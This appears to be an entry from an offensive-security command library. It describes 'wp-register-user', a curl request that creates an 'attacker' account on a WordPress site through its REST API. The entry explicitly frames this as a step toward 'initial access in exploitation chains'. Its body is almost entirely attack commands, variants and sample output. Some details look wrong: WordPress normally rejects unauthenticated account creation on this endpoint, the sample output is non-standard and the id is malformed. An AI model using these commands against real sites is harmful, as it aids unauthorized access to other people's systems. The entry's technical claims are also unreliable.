---
id: c1d2e3f4-g5h6-7891-defg-456789012345
data: >-
  curl -X POST https://target.com/wp-json/wp/v2/users -d
  '{"username":"attacker","email":"attacker@example.com","password":"weakpass123"}'
  -H 'Content-Type: application/json'
tags:
  - wordpress
  - registration
type: command
output: |-
  {
    "id": 123,
    "username": "attacker",
    "email": "attacker@example.com",
    "capabilities": ["subscriber"]
  }
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:48.294Z'
verified: false
validated: true
submitted: true
---
# wp-register-user

## Command

```bash
curl -X POST https://target.com/wp-json/wp/v2/users -d '{"username":"attacker","email":"attacker@example.com","password":"weakpass123"}' -H 'Content-Type: application/json'
```

## Description

Registers a new user via WordPress REST API when open registrations are enabled. Use for initial access in exploitation chains.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-d` | JSON payload with username, email, password | Yes |
| `-H` | Content-Type header | Yes |
| `https://target.com/wp-json/wp/v2/users` | Endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/wp-json/wp/v2/users -d '{"username":"test","email":"test@example.com","password":"pass"}' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST https://example.com/wp-json/wp/v2/users -d '{"username":"test","email":"test@example.com","password":"pass","roles":["subscriber"] }' -H 'Content-Type: application/json' --insecure
```

## Expected Output

JSON object with new user details, HTTP 201 status.

## Related

- [[commands/wp-login-user]]
- [[procedures/Register-New-User-on-WordPress-Site]]
